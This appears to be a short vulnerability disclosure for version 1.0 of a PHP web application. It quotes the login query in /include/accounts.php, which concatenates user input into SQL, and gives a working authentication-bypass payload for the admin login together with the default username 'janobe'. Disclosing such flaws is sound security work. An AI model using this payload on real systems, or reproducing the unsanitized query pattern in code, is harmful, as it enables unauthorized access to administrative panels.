# Affected Version: 1.0
# Vulnerable parameter: "user_email" (POST method)
# Tested on: Linux, PHP/7.4.11

Explaination:
The userAuthentication function defined in "/include/accounts.php" implements the following code:

$mydb->setQuery("SELECT * FROM `tbluseraccount` WHERE `U_USERNAME` = '". $U_USERNAME ."' and `U_PASS` = '". $h_pass ."'");

which is called when trying to log into the administrative panel at "/admin/login.php".

Proof Of Concept:

The user input is not properly sanitized and this leads to authentication bypass through the classic "<username>' or '1' = '1 -- -" where <username> has to be a valid username. For example, the default username is "janobe".
